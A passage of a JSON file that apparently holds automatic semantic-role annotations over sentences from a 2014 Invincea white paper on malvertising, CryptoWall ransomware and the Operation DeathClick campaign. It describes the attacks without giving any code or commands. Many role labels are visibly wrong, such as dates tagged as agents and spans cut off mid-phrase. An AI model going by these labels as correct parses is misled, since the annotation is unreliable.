{"ARGM-MNR": {"text": "By paying 65 cents to install a background web browser that does nothing but click fraud"}, "ARG1": {"text": "the malvertiser"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "able to reap hundreds if not thousands of dollars in advertising referral income"}}, "reap": {"ARG0": {"text": "the malvertiser"}, "V": {"text": "reap", "index": 22}, "ARG1": {"text": "hundreds"}, "ARGM-ADV": {"text": "if not thousands of dollars in advertising referral income"}}}, " This exploit copied a fully\nfunctional version of Chrome into the Java cache directory, and that version of Chrome launched in the\nbackground and proceeded to visit websites and click on specific ad banners": {"copied": {"ARG0": {"text": "This exploit"}, "V": {"text": "copied", "index": 2}, "ARG1": {"text": "a fully functional version of Chrome"}, "ARGM-GOL": {"text": "into the Java cache directory"}}, "launched": {"ARG0": {"text": "version of Chrome"}, "V": {"text": "launched", "index": 20}, "ARGM-LOC": {"text": "in the background"}}, "proceeded": {"ARG0": {"text": "version of Chrome"}, "V": {"text": "proceeded", "index": 25}, "ARG1": {"text": "to visit websites and click on specific ad banners"}}, "visit": {"ARG0": {"text": "version of Chrome"}, "V": {"text": "visit", "index": 27}, "ARG1": {"text": "websites"}}, "click": {"ARG0": {"text": "version of Chrome"}, "V": {"text": "click", "index": 30}, "ARG1": {"text": "on specific ad banners"}}}, "\n\nRansomware is a particularly pernicious form of malware that fully encrypts the victim\u2019s disk and data\nfiles, including remote storage, then demands payment of anywhere from $300 to $1000 in return for the\ndecryption key": {"is": {"ARG1": {"text": "Ransomware"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a particularly pernicious form of malware that fully encrypts the victim \u2019s disk and data files , including remote storage , then demands payment of anywhere from $ 300 to $ 1000 in return for the decryption key"}}, "encrypts": {"ARG0": {"text": "malware"}, "R-ARG0": {"text": "that"}, "ARGM-EXT": {"text": "fully"}, "V": {"text": "encrypts", "index": 10}, "ARG1": {"text": "the victim \u2019s disk and data files , including remote storage"}}, "including": {"ARG2": {"text": "fully encrypts the victim \u2019s disk and data files"}, "V": {"text": "including", "index": 19}, "ARG1": {"text": "remote storage"}}, "demands": {"R-ARG0": {"text": "that"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "demands", "index": 24}, "ARG1": {"text": "payment"}}}, "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       2\n</header>\n\n<section>\n\n<heading>Executive Summary</heading>\n\nMost targeted attacks against organizations originate as spear-phish campaigns or watering hole style\nweb driveby attacks": {"targeted": {"ARG2": {"text": "10.27.2014"}, "ARGM-EXT": {"text": "Most"}, "V": {"text": "targeted", "index": 5}, "ARG1": {"text": "attacks against organizations originate"}}, "originate": {"ARG1": {"text": "organizations"}, "V": {"text": "originate", "index": 9}}, "watering": {"V": {"text": "watering", "index": 16}, "ARG1": {"text": "hole style web driveby attacks"}}}, " In this instance, the Pubmatic server redirected to a Web\nserver in Poland that dropped the malware": {"redirected": {"ARGM-LOC": {"text": "In this instance"}, "ARG0": {"text": "the Pubmatic server"}, "V": {"text": "redirected", "index": 7}, "ARG2": {"text": "to a Web server in Poland that dropped the malware"}}, "dropped": {"ARG0": {"text": "a Web server in Poland"}, "R-ARG0": {"text": "that"}, "V": {"text": "dropped", "index": 15}, "ARG1": {"text": "the malware"}}}, "                                                Release Date: 10.27.2014\n</footer>\n\f                                                                                    \n<header>\nInvincea White Paper       26\n</header>\n\n\n<section>\n<heading>Ransomware Campaign via Malvertising</heading>\n\nIn September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall\nransomware attacks via Real Time Ad Bidding": {"saw": {"ARG0": {"text": "10.27.2014"}, "ARGM-TMP": {"text": "In September and October of 2014"}, "ARGM-LOC": {"text": "Invincea"}, "V": {"text": "saw", "index": 12}, "ARG1": {"text": "a sharp spike of malvertising delivering CryptoWall ransomware attacks"}, "ARGM-MNR": {"text": "via Real Time Ad Bidding"}}, "malvertising": {"V": {"text": "malvertising", "index": 17}, "ARG1": {"text": "delivering CryptoWall ransomware attacks"}, "ARGM-MNR": {"text": "via Real Time Ad Bidding"}}, "delivering": {"ARG0": {"text": "a sharp spike of malvertising"}, "V": {"text": "delivering", "index": 18}, "ARG1": {"text": "CryptoWall ransomware attacks"}}}, " In each instance, the attacks were carried out by targeting these Defense\ncontractors directly via real-time ad bidding": {"were": {"V": {"text": "were", "index": 6}}, "carried": {"ARGM-LOC": {"text": "In each instance"}, "ARG1": {"text": "the attacks"}, "V": {"text": "carried", "index": 7}, "ARG0": {"text": "by targeting these Defense contractors directly via real - time ad bidding"}}, "targeting": {"V": {"text": "targeting", "index": 10}, "ARG1": {"text": "these Defense contractors"}, "ARGM-MNR": {"text": "directly/ via real - time ad bidding"}}}, " Merely visiting any ad-supported site may result in a CryptoWall ransomware infection": {"visiting": {"ARGM-ADV": {"text": "Merely"}, "V": {"text": "visiting", "index": 1}, "ARG1": {"text": "any ad - supported site"}}, "supported": {"ARG0": {"text": "ad"}, "V": {"text": "supported", "index": 5}, "ARG1": {"text": "site"}}, "may": {"ARGM-ADV": {"text": "Merely"}, "ARG0": {"text": "visiting any ad - supported site"}, "V": {"text": "may", "index": 7}, "ARG1": {"text": "result"}}, "result": {"ARGM-ADV": {"text": "Merely"}, "ARG1": {"text": "visiting any ad - supported site"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "result", "index": 8}, "ARG2": {"text": "in a CryptoWall ransomware infection"}}}, " Figure 2 shows an event tree of\nthe exploit and malware delivered from an ad by visiting Fleaflicker.com": {"shows": {"ARG0": {"text": "Figure 2"}, "V": {"text": "shows", "index": 2}, "ARG1": {"text": "an event tree of the exploit and malware delivered from an ad by visiting Fleaflicker.com"}}, "delivered": {"ARG1": {"text": "an event tree of the exploit and malware"}, "V": {"text": "delivered", "index": 11}, "ARG2": {"text": "from an ad"}, "ARG0": {"text": "by visiting Fleaflicker.com"}}, "visiting": {"ARG0": {"text": "an event tree of the exploit and malware"}, "V": {"text": "visiting", "index": 16}, "ARG1": {"text": "Fleaflicker.com"}}}, " A small fraction is malicious content linking\nto landing pages that infect users": {"is": {"ARG1": {"text": "A small fraction"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "malicious content linking to landing pages that infect users"}}, "linking": {"ARG0": {"text": "malicious content"}, "V": {"text": "linking", "index": 6}, "ARG1": {"text": "to landing pages that infect users"}}, "infect": {"R-ARG0": {"text": "that"}, "V": {"text": "infect", "index": 11}, "ARG1": {"text": "users"}}}, "\n</section>\n<section>\n<heading>Operation DeathClick: Targeting the US Industrial Base</heading>\n\nRecently, multiple US Defense/Aerospace contractors were targeted by a malvertising campaign": {"were": {"V": {"text": "were", "index": 8}}, "targeted": {"ARGM-TMP": {"text": "Recently"}, "ARG1": {"text": "multiple US Defense / Aerospace contractors"}, "V": {"text": "targeted", "index": 9}, "ARG0": {"text": "by a malvertising campaign"}}, "malvertising": {"V": {"text": "malvertising", "index": 12}, "ARG0": {"text": "campaign"}}}, " We observed Real Time Ad bidding platforms, including\nOpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising\nscheme by unwittingly delivering the CryptoWall 2.0 ransomware ads": {"observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 1}, "ARG1": {"text": "Real Time Ad bidding platforms , including OpenX , GoogleAds , Yahoo , AOL , and first-impression.com , fall victim to the ransomware malvertising scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads"}}, "including": {"ARG2": {"text": "Ad bidding platforms"}, "V": {"text": "including", "index": 8}, "ARG1": {"text": "OpenX , GoogleAds , Yahoo , AOL , and first-impression.com"}}, "fall": {"ARGM-TMP": {"text": "Real"}, "ARG1": {"text": "Ad bidding platforms , including OpenX , GoogleAds , Yahoo , AOL , and first-impression.com"}, "V": {"text": "fall", "index": 20}, "ARG4": {"text": "victim/ to the ransomware malvertising scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads"}}, "malvertising": {"ARG0": {"text": "the ransomware"}, "V": {"text": "malvertising", "index": 25}, "ARG1": {"text": "scheme"}, "ARGM-MNR": {"text": "by unwittingly delivering the CryptoWall 2.0"}}, "delivering": {"ARG0": {"text": "Ad bidding platforms , including OpenX , GoogleAds , Yahoo , AOL , and first-impression.com ,"}, "ARGM-MNR": {"text": "unwittingly"}, "V": {"text": "delivering", "index": 29}, "ARG1": {"text": "the CryptoWall 2.0 ransomware ads"}}}, " So how do they get money to spend on\nthese malicious campaigns?\n\nInvincea recently saw a malvertiser win a bid and delivered a Java exploit": {"do": {"V": {"text": "do", "index": 2}}, "get": {"ARGM-MNR": {"text": "how"}, "ARG0": {"text": "they"}, "V": {"text": "get", "index": 4}, "ARG1": {"text": "money to spend on these malicious campaigns"}, "ARGM-LOC": {"text": "Invincea recently saw a malvertiser win a bid and delivered a Java exploit"}}, "spend": {"ARG0": {"text": "they"}, "ARG3": {"text": "money"}, "V": {"text": "spend", "index": 7}, "ARG1": {"text": "on these malicious campaigns"}}, "saw": {"ARGM-TMP": {"text": "recently"}, "V": {"text": "saw", "index": 15}, "ARG1": {"text": "a malvertiser win a bid and delivered a Java exploit"}}, "win": {"ARG0": {"text": "a malvertiser"}, "V": {"text": "win", "index": 18}, "ARG1": {"text": "a bid"}}, "delivered": {"ARGM-TMP": {"text": "recently"}, "ARG0": {"text": "a malvertiser"}, "V": {"text": "delivered", "index": 22}, "ARG1": {"text": "a Java exploit"}}}, "\n\nCryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files\non the disk, and demands bitcoin payment to unlock the files": {"utilizes": {"ARG0": {"text": "Cryptowall 2.0"}, "V": {"text": "utilizes", "index": 2}, "ARG1": {"text": "the TOR network"}, "ARGM-PRP": {"text": "to hide its communications"}}, "hide": {"V": {"text": "hide", "index": 7}, "ARG1": {"text": "its communications"}}, "encrypts": {"ARG0": {"text": "it"}, "ARGM-MNR": {"text": "quickly"}, "V": {"text": "encrypts", "index": 14}, "ARG1": {"text": "all local files"}, "ARGM-LOC": {"text": "on the disk"}}, "demands": {"ARG0": {"text": "it"}, "V": {"text": "demands", "index": 23}, "ARG1": {"text": "bitcoin payment to unlock the files"}}, "unlock": {"V": {"text": "unlock", "index": 27}, "ARG1": {"text": "the files"}}}, " Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-\nsupported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web\nexploits": {"is": {"V": {"text": "is", "index": 3}}, "stolen": {"ARG1": {"text": "Legitimate ad copy"}, "V": {"text": "stolen", "index": 4}}, "used": {"V": {"text": "used", "index": 10}}, "distribute": {"ARG0": {"text": "3rd party ad networks"}, "V": {"text": "distribute", "index": 12}, "ARG1": {"text": "malware"}}, "supported": {"ARG0": {"text": "popular ad-"}, "V": {"text": "supported", "index": 18}, "ARG1": {"text": "websites"}}, "displaying": {"ARG0": {"text": "popular ad-"}, "V": {"text": "displaying", "index": 20}, "ARG1": {"text": "the malicious ads that exploit unsuspecting visitors with drive - by web exploits"}}, "exploit": {"ARG0": {"text": "the malicious ads"}, "R-ARG0": {"text": "that"}, "V": {"text": "exploit", "index": 25}, "ARG1": {"text": "unsuspecting"}, "ARGM-ADV": {"text": "by web exploits"}}}, " As we\nhave detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools\nand techniques to target companies with malware for persistent remote access in addition to traditional\nclick fraud, phishing, and identity theft": {"have": {"ARG0": {"text": "we"}, "V": {"text": "have", "index": 2}, "ARG1": {"text": "detailed"}, "ARGM-LOC": {"text": "here"}}, "detailed": {"ARG0": {"text": "we"}, "V": {"text": "detailed", "index": 3}, "ARGM-LOC": {"text": "here"}}, "can": {"V": {"text": "can", "index": 7}}, "be": {"ARGM-ADV": {"text": "As we have detailed here/ also"}, "ARG1": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 9}, "ARGM-MNR": {"text": "mis - appropriated unwittingly"}, "ARG2": {"text": "by malvertisers using these same tools and techniques to target companies with malware for persistent remote access in addition to traditional click fraud , phishing , and identity theft"}}, "appropriated": {"ARGM-TMP": {"text": "As we have detailed here"}, "ARG1": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "ARGM-MNR": {"text": "mis -/ unwittingly/ using these same tools and"}, "V": {"text": "appropriated", "index": 12}, "ARG0": {"text": "by malvertisers"}, "ARGM-PRD": {"text": "techniques to target companies with malware for persistent remote access in addition to traditional click fraud , phishing , and identity theft"}}, "using": {"ARG0": {"text": "they"}, "V": {"text": "using", "index": 16}, "ARG1": {"text": "these same tools and techniques"}, "ARG2": {"text": "to target companies with malware for persistent remote access in addition to traditional click fraud , phishing , and identity theft"}}, "target": {"ARG0": {"text": "they"}, "V": {"text": "target", "index": 23}, "ARG1": {"text": "companies"}, "ARG2": {"text": "with malware"}, "ARGM-PRP": {"text": "for persistent remote access in addition to traditional click fraud , phishing , and identity theft"}}, "phishing": {"V": {"text": "phishing", "index": 38}}}, "                                                         Release Date: 10.27.2014\n</footer>\n\f                                                                                  \n<header>\nInvincea White Paper     29\n</header>\n\n\nIn addition, you can see the ransom note being written to disk on an infected machine in the audit logs\nin Figure 24": {"can": {"V": {"text": "can", "index": 8}}, "see": {"ARGM-DIS": {"text": "Release/ 10.27.2014 In addition"}, "ARG0": {"text": "you"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 9}, "ARG1": {"text": "the ransom note being written to disk on an infected machine in the audit logs in Figure 24"}}, "being": {"V": {"text": "being", "index": 13}}, "written": {"ARG1": {"text": "the ransom note"}, "V": {"text": "written", "index": 14}, "C-ARG1": {"text": "to disk"}, "ARGM-LOC": {"text": "on an infected machine/ in the audit logs/ in Figure 24"}}, "disk": {"V": {"text": "disk", "index": 16}, "ARGM-LOC": {"text": "on an infected machine/ in the audit logs in Figure"}}}, "\n\nTraditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to\ncompromise endpoints to perpetrate ad fraud, identity fraud, and banking credential theft": {"has": {"V": {"text": "has", "index": 2}}, "been": {"ARG1": {"text": "Traditional malvertizing"}, "V": {"text": "been", "index": 3}, "ARG2": {"text": "an effective but indiscriminate method cyber crime gangs use to compromise endpoints to perpetrate ad fraud , identity fraud , and banking credential theft"}}, "compromise": {"V": {"text": "compromise", "index": 14}, "ARG1": {"text": "endpoints"}, "ARGM-PRP": {"text": "to perpetrate ad fraud , identity fraud , and banking credential theft"}}, "perpetrate": {"V": {"text": "perpetrate", "index": 17}, "ARG1": {"text": "ad fraud , identity fraud"}}, "banking": {"V": {"text": "banking", "index": 25}}}, "\n</section>\n\n<section>\n<heading>Real-Time Bidding Networks: How it works</heading>\n\nWe observed in Operation DeathClick that real-time ad bidding networks are being used by criminal\nenterprise to target companies with malicious content in order to gain persistent remote access": {"observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 1}, "ARGM-LOC": {"text": "in Operation DeathClick"}, "ARG1": {"text": "that real - time ad bidding networks are being used by criminal enterprise to target companies with malicious content in order to gain persistent remote access"}}, "are": {"V": {"text": "are", "index": 12}}, "being": {"V": {"text": "being", "index": 13}}, "used": {"ARG1": {"text": "real - time ad bidding networks"}, "V": {"text": "used", "index": 14}, "ARG0": {"text": "by criminal enterprise"}, "ARG2": {"text": "to target companies with malicious content in order to gain persistent remote access"}}, "target": {"ARG0": {"text": "real - time ad bidding networks"}, "V": {"text": "target", "index": 19}, "ARG2": {"text": "companies"}, "ARG1": {"text": "with malicious content"}, "ARGM-PRP": {"text": "in order to gain persistent remote access"}}, "gain": {"V": {"text": "gain", "index": 27}, "ARG1": {"text": "persistent remote access"}}}, " But it is very simple to replace the redirection code\nto switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash,\nSilverlight, or all three": {"is": {"ARGM-DIS": {"text": "But"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "very simple"}, "ARG1": {"text": "to replace the redirection code to switch from a legitimate ad banner to a drop site that hosts an exploit kit , typically based on Java , Flash , Silverlight , or all three"}}, "replace": {"V": {"text": "replace", "index": 6}, "ARG1": {"text": "the redirection code"}, "ARGM-PRP": {"text": "to switch from a legitimate ad banner to a drop site that hosts an exploit kit , typically based on Java , Flash , Silverlight , or all three"}}, "switch": {"ARG0": {"text": "the redirection code"}, "V": {"text": "switch", "index": 11}, "ARG3": {"text": "from a legitimate ad banner"}, "ARG2": {"text": "to a drop site that hosts an exploit kit , typically based on Java , Flash , Silverlight , or all three"}}, "hosts": {"ARG0": {"text": "a drop site"}, "R-ARG0": {"text": "that"}, "V": {"text": "hosts", "index": 22}, "ARG1": {"text": "an exploit kit"}}, "based": {"ARG1": {"text": "a drop site that hosts an exploit kit"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "based", "index": 28}, "ARG2": {"text": "on Java , Flash , Silverlight , or all three"}}}, "\nBut the malware delivery could have been intended for data exfiltration, banking Trojans, or any other\nmore insidious purpose": {"could": {"V": {"text": "could", "index": 4}}, "have": {"V": {"text": "have", "index": 5}}, "been": {"V": {"text": "been", "index": 6}}, "intended": {"ARGM-DIS": {"text": "But"}, "ARG2": {"text": "the malware delivery"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "intended", "index": 7}, "ARG1": {"text": "for data exfiltration , banking Trojans , or any other more insidious purpose"}}, "banking": {"V": {"text": "banking", "index": 12}, "ARG2": {"text": "Trojans"}}}, "\n\nIn the campaign described here, Operation DeathClick, traditional malvertising has been armed with a\nmicro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests\nof the user (recorded in cookies) to target specific companies, company types, and user\ninterests/preferences": {"described": {"ARG1": {"text": "the campaign"}, "V": {"text": "described", "index": 3}, "ARGM-LOC": {"text": "here"}}, "has": {"V": {"text": "has", "index": 11}}, "been": {"V": {"text": "been", "index": 12}}, "armed": {"ARGM-LOC": {"text": "In the campaign described here"}, "ARG1": {"text": "Operation DeathClick , traditional malvertising"}, "V": {"text": "armed", "index": 13}, "ARG2": {"text": "with a micro - targeting system"}, "ARGM-MNR": {"text": "using IP address ranges"}, "ARGM-PRD": {"text": ", geographically narrowed down to zip codes , and interests of the user ( recorded in cookies ) to target specific companies , company types , and user interests / preferences"}}, "using": {"ARG0": {"text": "Operation DeathClick , traditional malvertising"}, "V": {"text": "using", "index": 20}, "ARG1": {"text": "IP address ranges"}}, "ranges": {"ARG1": {"text": "IP address"}, "V": {"text": "ranges", "index": 23}}, "narrowed": {"ARGM-LOC": {"text": "In the campaign described here"}, "ARG1": {"text": "Operation DeathClick , traditional malvertising"}, "ARGM-MNR": {"text": "geographically"}, "V": {"text": "narrowed", "index": 26}, "ARGM-DIR": {"text": "down"}, "ARG4": {"text": "to zip codes"}}, "recorded": {"ARG1": {"text": "the user"}, "V": {"text": "recorded", "index": 38}, "ARGM-LOC": {"text": "in cookies"}}, "target": {"ARG0": {"text": "interests of the user ("}, "V": {"text": "target", "index": 43}, "ARG1": {"text": "specific companies , company types , and user interests / preferences"}}}, " But what if the landing pages that are\nsupposed to be ads are actually malicious PHP pages with embedded malware? The bidding and ad\nplacements work the same, but instead of seeing a flashy ad banner, the highest bidder for the placement\nserves malware": {"are": {"V": {"text": "are", "index": 7}}, "supposed": {"ARG1": {"text": "the landing pages"}, "R-ARG1": {"text": "that"}, "V": {"text": "supposed", "index": 8}, "ARG2": {"text": "to be ads"}}, "be": {"ARG1": {"text": "the landing pages"}, "R-ARG1": {"text": "that"}, "V": {"text": "be", "index": 10}, "ARG2": {"text": "ads"}}, "are_2": {"ARG1": {"text": "the landing pages that are supposed to be ads"}, "V": {"text": "are", "index": 12}, "ARGM-ADV": {"text": "actually"}, "ARG2": {"text": "malicious PHP pages with embedded malware"}}, "embedded": {"V": {"text": "embedded", "index": 18}, "ARG1": {"text": "malware"}}, "work": {"ARGM-ADV": {"text": "what if the landing pages that are supposed to be ads are actually malicious PHP pages with embedded malware"}, "ARG0": {"text": "The bidding and ad placements"}, "V": {"text": "work", "index": 26}, "ARGM-MNR": {"text": "the same"}}, "seeing": {"ARG0": {"text": "The bidding and ad placements"}, "V": {"text": "seeing", "index": 33}, "ARG1": {"text": "a flashy ad banner , the highest bidder for the placement"}}, "serves": {"ARGM-ADV": {"text": "instead of seeing a flashy ad banner"}, "ARG0": {"text": "the highest bidder for the placement"}, "V": {"text": "serves", "index": 45}, "ARG2": {"text": "malware"}}}, " And now, with the advent of real-time ad bidding, these threat actors have\nweaponized ad delivery networks to target victims based on:\n<list>\n    \uf0b7   User-Agent strings (versions of flash, OS, java and browser)\n    \uf0b7   Interest-related content (click bait articles, industry specific software or hardware, like medical\n        supplies, radar mapping software, ammunition sales, stocks forums)\n    \uf0b7   Advertising Profiles derived from cookies (someone with specific tastes, may shop for shoes,\n        handbags, cars, luxury vacations)\n    \uf0b7   Geographic region (malvertisers can target specific neighborhoods or states via geoip direct\n        advertising)\n    \uf0b7   Specific corporate IP ranges (targeted malvertising can target the public IP space of your network\n        or an Industrial Vertical)\n</list>\n\n\n\n<footer>\nInvincea, Inc": {"have": {"V": {"text": "have", "index": 16}}, "weaponized": {"ARGM-DIS": {"text": "And"}, "ARGM-TMP": {"text": "now"}, "ARGM-CAU": {"text": "with the advent of real - time ad bidding"}, "ARG0": {"text": "these threat actors"}, "V": {"text": "weaponized", "index": 17}, "ARG1": {"text": "ad delivery networks"}, "ARG2": {"text": "to target victims based on : Invincea , Inc"}}, "target": {"ARG0": {"text": "ad delivery networks"}, "V": {"text": "target", "index": 22}, "ARG1": {"text": "victims based on : Invincea"}}, "based": {"V": {"text": "based", "index": 24}, "ARG2": {"text": "on"}}}, "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       10\n</header>\n\n<figure></figure>\n\n\n                                   <caption>Figure 7: Event Tree for Gpokr.com</caption>\n\nThis event on September 14 (Figure 8) shows that delivery.first-impression.com redirected directly to an\nIP address, not a domain name to deliver its malicious payload": {"shows": {"ARG0": {"text": "10.27.2014 This event on September 14 ( Figure 8)"}, "V": {"text": "shows", "index": 12}, "ARG1": {"text": "that delivery.first-impression.com redirected directly to an IP address , not a domain name to deliver its malicious payload"}}, "redirected": {"ARG0": {"text": "delivery.first-impression.com"}, "V": {"text": "redirected", "index": 15}, "ARGM-MNR": {"text": "directly"}, "ARG2": {"text": "to an IP address , not a domain name"}, "ARGM-PRP": {"text": "to deliver its malicious payload"}}, "deliver": {"ARG0": {"text": "delivery.first-impression.com redirected"}, "V": {"text": "deliver", "index": 27}, "ARG1": {"text": "its malicious payload"}}}, " The timeline will show that when the user replied to an email, the ads\non the Earthlink page refreshed, dropping the exploit code via Java": {"will": {"V": {"text": "will", "index": 2}}, "show": {"ARG0": {"text": "The timeline"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "show", "index": 3}, "ARG1": {"text": "that when the user replied to an email , the ads on the Earthlink page refreshed , dropping the exploit code via Java"}}, "replied": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "the user"}, "V": {"text": "replied", "index": 8}, "ARG1": {"text": "to an email"}}, "refreshed": {"ARGM-TMP": {"text": "when the user replied to an email"}, "ARG1": {"text": "the ads on the Earthlink page"}, "V": {"text": "refreshed", "index": 19}, "ARGM-PRD": {"text": "dropping the exploit code via Java"}}, "dropping": {"ARG0": {"text": "the ads on the Earthlink page"}, "V": {"text": "dropping", "index": 21}, "ARG1": {"text": "the exploit code"}, "ARG4": {"text": "via Java"}}}, " Those ad windows can and\nare being used to deliver malware if the bidding price is right": {"can": {"ARG0": {"text": "Those ad windows"}, "V": {"text": "can", "index": 3}}, "are": {"V": {"text": "are", "index": 5}}, "being": {"V": {"text": "being", "index": 6}}, "used": {"ARG1": {"text": "Those ad windows"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 7}, "ARG2": {"text": "to deliver malware if the bidding price is right"}}, "deliver": {"ARG0": {"text": "Those ad windows"}, "V": {"text": "deliver", "index": 9}, "ARG1": {"text": "malware"}, "ARGM-ADV": {"text": "if the bidding price is right"}}, "is": {"ARG1": {"text": "the bidding price"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "right"}}}, "\n\nBut in a two week period, these organizations were hit with dozens of micro-targeted malvertising attacks,\neach of which would have provided a beachhead for the threat actors from which to compromise the\nnetwork, if successful": {"were": {"V": {"text": "were", "index": 9}}, "hit": {"ARGM-DIS": {"text": "But"}, "ARGM-TMP": {"text": "in a two week period"}, "ARG1": {"text": "these organizations"}, "V": {"text": "hit", "index": 10}, "ARG2": {"text": "with dozens of micro - targeted malvertising attacks , each of which would have provided a beachhead for the threat actors from which to compromise the network , if successful"}}, "targeted": {"ARG2": {"text": "micro"}, "V": {"text": "targeted", "index": 16}, "ARG1": {"text": "malvertising attacks"}}, "malvertising": {"V": {"text": "malvertising", "index": 17}, "ARG1": {"text": "attacks"}}, "would": {"V": {"text": "would", "index": 23}}, "have": {"V": {"text": "have", "index": 24}}, "provided": {"ARG0": {"text": "dozens of micro - targeted malvertising attacks"}, "R-ARG0": {"text": "each of which"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "provided", "index": 25}, "ARG2": {"text": "a beachhead"}, "ARG1": {"text": "for the threat actors from which to compromise the network , if successful"}}, "compromise": {"ARG3": {"text": "the threat actors"}, "R-ARG3": {"text": "from which"}, "V": {"text": "compromise", "index": 35}, "ARG1": {"text": "the network"}}}, "\n\nBased on analysis of Invincea logs in would-be victims targeted by these ads, we have insight into the\nattacker that is delivering the malicious ads": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "on analysis of Invincea logs in would - be victims targeted by these ads"}}, "would": {"V": {"text": "would", "index": 7}}, "be": {"ARGM-MOD": {"text": "would"}, "V": {"text": "be", "index": 9}}, "targeted": {"ARG1": {"text": "Invincea logs in would - be victims"}, "V": {"text": "targeted", "index": 11}, "ARG0": {"text": "by these ads"}}, "have": {"V": {"text": "have", "index": 17}}, "is": {"V": {"text": "is", "index": 23}}, "delivering": {"ARG0": {"text": "the attacker"}, "R-ARG0": {"text": "that"}, "V": {"text": "delivering", "index": 24}, "ARG1": {"text": "the malicious ads"}}}, " The event tree in Figure 10 notes that\nthis was likely a spear-phish attack": {"was": {"ARG1": {"text": "this"}, "V": {"text": "was", "index": 9}, "ARG2": {"text": "likely a spear - phish attack"}}}, " When they replied to an email,\na new ad was loaded on a page that attempted to exploit Java": {"replied": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "they"}, "V": {"text": "replied", "index": 2}, "ARG1": {"text": "to an email"}}, "was": {"V": {"text": "was", "index": 10}}, "loaded": {"ARGM-TMP": {"text": "When they replied to an email"}, "ARG2": {"text": "a new ad"}, "V": {"text": "loaded", "index": 11}, "ARG1": {"text": "on a page that attempted to exploit Java"}}, "attempted": {"ARG0": {"text": "a page"}, "R-ARG0": {"text": "that"}, "V": {"text": "attempted", "index": 16}, "ARG1": {"text": "to exploit Java"}}, "exploit": {"ARG0": {"text": "a"}, "R-ARG0": {"text": "that"}, "V": {"text": "exploit", "index": 18}, "ARG1": {"text": "Java"}}}, " Most of the attacks featured here were not\ndetected by standard Anti-Virus because the malware hashes constantly change": {"featured": {"ARG1": {"text": "Most of the attacks"}, "V": {"text": "featured", "index": 4}, "ARG2": {"text": "here"}}, "were": {"V": {"text": "were", "index": 6}}, "detected": {"ARG1": {"text": "Most of the attacks featured here"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "detected", "index": 8}, "ARG0": {"text": "by standard Anti - Virus"}, "ARGM-CAU": {"text": "because the malware hashes constantly change"}}, "hashes": {"ARG0": {"text": "the malware"}, "V": {"text": "hashes", "index": 17}}, "change": {"ARG1": {"text": "the malware hashes"}, "ARGM-TMP": {"text": "constantly"}, "V": {"text": "change", "index": 19}}}, " The malware delivered came from a compromised Polish website, and\nwould have installed a generic backdoor Trojan": {"delivered": {"ARG0": {"text": "The malware"}, "V": {"text": "delivered", "index": 2}, "ARG1": {"text": "came from a compromised Polish website"}}, "came": {"ARG1": {"text": "The malware"}, "V": {"text": "came", "index": 3}, "ARG2": {"text": "from a compromised Polish website"}}, "compromised": {"V": {"text": "compromised", "index": 6}, "ARG1": {"text": "Polish website"}}, "would": {"V": {"text": "would", "index": 11}}, "have": {"V": {"text": "have", "index": 12}}, "installed": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "installed", "index": 13}, "ARG1": {"text": "a generic"}, "ARG2": {"text": "backdoor"}}}, " Since these attacks were blocked by Invincea prior to compromise of the machine\nor network, we cannot confirm the specific IP the perpetrators are after \u2013 only the Tactics, Techniques,\nand Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access\nand command and control over compromised networks": {"were": {"V": {"text": "were", "index": 3}}, "blocked": {"ARG1": {"text": "these attacks"}, "V": {"text": "blocked", "index": 4}, "ARG0": {"text": "by"}, "ARGM-MNR": {"text": "Invincea"}, "ARGM-TMP": {"text": "prior to compromise of the machine or network"}}, "confirm": {"ARGM-CAU": {"text": "Since these attacks were blocked by Invincea prior to compromise of the machine or network"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "confirm", "index": 19}, "ARG1": {"text": "the specific IP the perpetrators are after \u2013 only the Tactics , Techniques , and Protocols ( TTPs ) used which we describe herein , similar to methods used to provide backdoor access and command and control over compromised networks"}}, "are": {"ARG1": {"text": "the"}, "V": {"text": "are", "index": 25}}, "used": {"ARG1": {"text": "the Tactics , Techniques , and Protocols ( TTPs )"}, "V": {"text": "used", "index": 39}, "ARGM-ADJ": {"text": "which we describe herein"}}, "describe": {"ARG1": {"text": "only the Tactics , Techniques , and Protocols ( TTPs ) used"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "we"}, "V": {"text": "describe", "index": 42}, 